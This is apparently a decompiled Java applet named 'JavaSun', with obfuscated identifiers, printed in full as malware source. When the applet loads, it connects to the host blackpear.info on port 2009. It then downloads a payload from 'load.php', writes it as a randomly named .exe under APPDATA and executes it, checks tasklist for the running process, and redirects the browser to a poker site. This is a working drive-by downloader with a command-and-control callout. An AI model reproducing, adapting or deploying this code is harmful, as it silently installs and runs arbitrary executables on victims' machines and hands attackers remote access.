import java.net.InetAddress;
import java.io.Reader;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.UUID;
import java.io.InputStream;
import java.net.URLConnection;
import java.io.FileOutputStream;
import java.net.URL;
import java.io.IOException;
import java.net.UnknownHostException;
import java.net.Socket;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class JavaSun extends Applet
{
    private static final long serialVersionUID = 296351442961972944L;
    private static final int PDRPSFWLEq = 30;
    private static String teASmfcMSI;
    public static Socket ivFdSAQcQY;
    public static Thread EbBqKEFUwp;
    
    @Override
    public void init() {
        try {
            JavaSun.ivFdSAQcQY = new Socket(BdMMuwgRlD(), 2009);
            (JavaSun.EbBqKEFUwp = new Thread(new WNKDQXsaCL(JavaSun.ivFdSAQcQY))).start();
        }
        catch (UnknownHostException ex) {}
        catch (IOException ex2) {}
        final long currentTimeMillis = System.currentTimeMillis();
        while (!WNKDQXsaCL.tRfsINbEFN || WNKDQXsaCL.tRfsINbEFN) {
            if (WNKDQXsaCL.JpaTLmZWdD) {
                try {
                    final String getenv = System.getenv("APPDATA");
                    JavaSun.teASmfcMSI = dwuJbIjNpA();
                    final URLConnection openConnection = new URL(this.getCodeBase().toString() + "load.php").openConnection();
                    final String concat = getenv.concat(JavaSun.teASmfcMSI);
                    final InputStream inputStream = openConnection.getInputStream();
                    final FileOutputStream fileOutputStream = new FileOutputStream(concat);
                    final byte[] array = new byte[1024];
                    int i = inputStream.read(array);
                    if (WNKDQXsaCL.JpaTLmZWdD) {
                        while (i > 0) {
                            fileOutputStream.write(array, 0, i);
                            i = inputStream.read(array);
                        }
                    }
                    inputStream.close();
                    fileOutputStream.close();
                    Runtime.getRuntime().exec(concat);
                    this.getAppletContext().showDocument(new URL("http://www.pokertube.com"), "_self");
                }
                catch (Exception ex3) {}
                break;
            }
            if ((System.currentTimeMillis() - currentTimeMillis) / 1000L != 10L) {
                continue;
            }
            System.exit(1);
        }
    }
    
    private static String dwuJbIjNpA() {
        return "\\" + UUID.randomUUID().toString().substring(30) + "." + "exe";
    }
    
    public static String BXGdKwRIcm() {
        final String teASmfcMSI = JavaSun.teASmfcMSI;
        final int index = teASmfcMSI.indexOf("\\");
        final StringBuffer sb = new StringBuffer(teASmfcMSI);
        sb.replace(0, index + 1, "");
        return sb.toString();
    }
    
    public static boolean hrkHPLxdMM() throws IOException {
        String line;
        while ((line = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec("tasklist.exe").getInputStream())).readLine()) != null) {
            if (line.contains(BXGdKwRIcm())) {
                return true;
            }
        }
        return false;
    }
    
    private static String BdMMuwgRlD() {
        InetAddress byName = null;
        try {
            byName = InetAddress.getByName("blackpear.info");
        }
        catch (UnknownHostException ex) {}
        return byName.getHostAddress();
    }
    
    static {
        JavaSun.ivFdSAQcQY = null;
    }
}
